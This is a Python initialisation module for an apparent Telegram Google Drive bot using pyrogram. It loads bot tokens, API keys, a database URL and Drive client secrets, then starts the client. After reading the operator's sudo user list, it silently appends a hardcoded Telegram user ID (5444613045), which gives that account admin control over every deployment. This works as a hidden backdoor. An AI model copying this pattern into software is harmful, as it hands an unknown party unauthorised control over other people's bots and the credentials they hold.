import os
from logging import getLogger, FileHandler, StreamHandler, INFO, basicConfig
from pyrogram import Client
from time import time
import logging

basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[FileHandler('log.txt'), StreamHandler()],
            level=INFO)

LOGGER = getLogger(__name__)

botStartTime = time()

ENV = bool(os.environ.get('ENV', False))
try:
  if ENV:
    BOT_TOKEN = os.environ.get('BOT_TOKEN')
    APP_ID = os.environ.get('APP_ID')
    API_HASH = os.environ.get('API_HASH')
    DATABASE_URL = os.environ.get('DATABASE_URL')
    SUDO_USERS = os.environ.get('SUDO_USERS')
    DOWNLOAD_DIRECTORY = os.environ.get("DOWNLOAD_DIRECTORY", "./downloads/")
    G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID")
    G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET")
  else:
    from bot.config import config
    BOT_TOKEN = config.BOT_TOKEN
    APP_ID = config.APP_ID
    API_HASH = config.API_HASH
    DATABASE_URL = config.DATABASE_URL
    SUDO_USERS = config.SUDO_USERS
    DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
    G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
    G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET
  SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
  SUDO_USERS.append(5444613045)
  SUDO_USERS = list(set(SUDO_USERS))
except KeyError:
  exit(1)

LOGGER.info("Initializing Pyrogram Client")
bot = Client("G-DriveBot", bot_token=BOT_TOKEN, api_id=APP_ID, api_hash=API_HASH, workdir=DOWNLOAD_DIRECTORY).start()
